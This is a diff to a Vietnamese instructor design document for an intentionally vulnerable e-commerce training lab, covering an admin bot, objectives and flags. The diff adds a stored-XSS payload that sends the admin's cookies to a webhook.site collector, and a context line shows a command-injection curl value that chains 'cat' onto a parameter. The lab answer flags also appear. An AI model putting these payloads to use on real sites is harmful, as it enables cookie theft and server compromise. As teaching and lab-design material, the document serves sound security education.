@@ -10,10 +10,10 @@
 | Thành phần | Chi tiết |
 |------------|----------|
 | Web | Node20/Express/EJS — host :7110, domain shop.ghedahaui.online |
-| Mongo | users / orders / notes (internal) |
+| Mongo | users / orders (internal) |
 | MySQL | products / reviews / **shopusers** mirror MD5 (internal) |
 | flag-service | Go :8080 internal — /health /info /metrics **/flag** |
-| xss-bot | Playwright, login admin, visit `/admin/reviews` mỗi 30s |
+| xss-bot | Playwright, login admin, visit `/admin/reviews` mỗi 30s — nằm trên edge network, CÓ Internet egress (để exfil webhook) |
 
 **Trang `/objectives` (student-facing):** danh sách 16 mục tiêu viết trung tính (chỉ mô tả kết quả, không nói kỹ thuật) + form nộp evidence token. Nộp đúng `FLAG{cN}` → hiện card "✓ OBJECTIVE COMPLETED" với checklist "You demonstrated..." + tên kỹ thuật + gợi ý bước tiếp theo ghi journal. Song ngữ theo cookie `lang` (mặc định vi). Chỉ validate, không lưu trạng thái — học viên tự tích bảng checklist in từ bài học.
 
@@ -205,27 +205,25 @@ curl -H "Cookie: <admin-token>" --data-urlencode 'target=x; cat /opt/scripts/net
 - *Điểm dạy:* phân biệt self vs stored vs reflected; self-XSS riêng rẻ impact ~0, nguy hiểm khi chain với CSRF/login-CSRF lỡ nạn nhân dán payload vào phiên của họ.
 
 **Stored XSS (C14)**
-- *Bản chất:* review lưu DB nguyên văn, render raw ở `/product/:id` VÀ `/admin/reviews` — trang mà **xss-bot (admin giả lập)** visit mỗi 30s. Nạn nhân là admin, không phải bạn.
-- *Sơ đồ flow (đọc kỹ để khỏi nhầm vai trò từng thành phần):*
+- *Bản chất:* review lưu DB nguyên văn, render raw ở `/product/:id` VÀ `/admin/reviews` — trang mà **xss-bot (admin giả lập)** visit mỗi 30s. Nạn nhân là admin, không phải bạn. Cookie `token` là HttpOnly (không đọc được bằng `document.cookie`) NHƯNG server set kèm cookie **`moderation_key=FLAG{c14}` không HttpOnly khi admin login** ("legacy console cache") → cookie-theft có đồ mà lấy.
+- *Sơ đồ flow:*
   ```
   Học viên trồng <script> vào REVIEW SẢN PHẨM (/product/<id>/review)
         ↓ lưu RAW vào MySQL (không sanitize)
-  BOT ADMIN (duy nhất 1 bot) login + vào /admin/reviews mỗi 30s để "kiểm duyệt"
+  BOT ADMIN login + vào /admin/reviews mỗi 30s (bot có Internet egress)
         ↓ script CHẠY TRONG BROWSER CỦA ADMIN — attacker ≠ victim
-  Script đọc moderation key FLAG{c14} ngay trên trang (chỉ admin thấy)
-        ↓ POST /api/notes
-  GÓP Ý (/notes) = KÊNH NHẬN EXFIL — công khai, KHÔNG có bot ghé,
-  học viên tự mở ra đọc "đồ cướp". (/notes cũng là stored-XSS sink
-  nhìn thấy bởi mọi người — xem mục 4b số 3 về instance dùng chung.)
+  document.cookie chứa moderation_key=FLAG{c14} (token thì HttpOnly!)
+        ↓ exfil về COLLECTOR CỦA HỌC VIÊN (webhook.site/...)
+  Học viên mở inbox webhook của mình → nhận cookie + flag
   ```
-- *Phát hiện:* form review không sanitize (thử `<b>test</b>` in đậm thật); missions hint nhắc bot đọc review định kỳ.
-- *Payload đã verify (exfil moderation key về /notes):*
+- *Phát hiện:* form review không sanitize (thử `<b>test</b>` in đậm thật); missions hint nhắc bot đọc review định kỳ; decode cookie của chính mình sau khi login admin thấy `moderation_key`.
+- *Payload mẫu (đã verify cơ chế — thay UUID webhook của học viên):*
   ```html
-  <script>fetch("/api/notes",{method:"POST",headers:{"Content-Type":"application/json"},
-  body:JSON.stringify({text:"EXFIL:"+document.body.innerText.match(/FLAG\{[^}]+\}/)[0]})})</script>
+  <script>new Image().src="https://webhook.site/<uuid>?c="+encodeURIComponent(document.cookie)</script>
   ```
-  → chờ tối đa ~40s (chu kỳ bot 30s + 8s giữ trang) → `/notes` hiện `EXFIL:FLAG{c14}`. Lưu ý field API là `text` (không phải `content`) — lỗi phổ biến khi test tay. Smoke test tự động hóa chuỗi này (`WITH_BOT=1 ./smoke-test.sh`, chờ 55s).
-- *Fix đúng:* escape khi render, sanitize-html khi lưu, CSP `script-src 'self'`, cookie admin `httpOnly` (đã có) + SameSite.
+  hoặc fetch với encodeURIComponent. → chờ tối đa ~40s (chu kỳ bot 30s + 8s giữ trang) → inbox webhook hiện `moderation_key=FLAG{c14}; shop_state=...`. Lỗi dạy kèm: quên encodeURIComponent mất dấu `&`/`+`; dùng https cho trang https (mixed content chặn http).
+- *Smoke test:* `WITH_BOT=1 ./smoke-test.sh` tự trồng payload exfil về collector local (python http.server trên gateway của mạng edge) và khẳng định cookie chứa moderation_key đến nơi.
+- *Fix đúng:* escape khi render, sanitize-html khi lưu, CSP `script-src 'self'`, HttpOnly cho MỌI cookie nhạy cảm (không chỉ token), SameSite.
 
 **CSRF (C16)**
 - *Bản chất:* `POST /profile/password` đổi mật khẩu KHÔNG có CSRF token, cookie không SameSite, không check Origin/Referer → site ngoài có thể ép browser nạn nhân (đang đăng nhập) gửi request.
@@ -258,7 +256,7 @@ curl -H "Cookie: <admin-token>" --data-urlencode 'target=x; cat /opt/scripts/net
 
 2. **RCE = đọc được source = bẻ được hết** → **KHÔNG hard-wall. Để nguyên.** Đây là thực tế: một primitive RCE có impact lớn hơn nhiều so với một flag riêng lẻ — và đó là bài học. Chống ăn điểm bằng **scoring rule**: RCE cho điểm M4 + Post-Exploit Impact, nhưng KHÔNG tự động tính điểm các finding C1–C13; từng finding phải có evidence độc lập. Đã ghi vào missions.md (mục M4) và mục 2.
 
-3. **Instance dùng chung lộ đáp án chéo** → giữ khuyến nghị **1 stack compose / 1 học viên hoặc nhóm**, reset sau session. Platform spin per-session thì không vấn đề.
+3. **Instance dùng chung lộ đáp án chéo** → reviews stored XSS lưu chung → payload A chạy trong browser B. Giữ khuyến nghị **1 stack compose / 1 học viên hoặc nhóm**, reset sau session. Platform spin per-session thì không vấn đề.
 
 4. **Thời lượng** → `lab_duration = 7200` (2h) làm trần platform; pedagogy chia **3 session × 60–90 phút**: (S1) Recon + M1 + M2 · (S2) M3 + M4 · (S3) free play + chaining + report. Junior yếu vẫn hoàn thành 3–5 finding; khá thì chain; mạnh phá nát app — một lab phục vụ cả ba mức, không cần 3 bản difficulty.
 
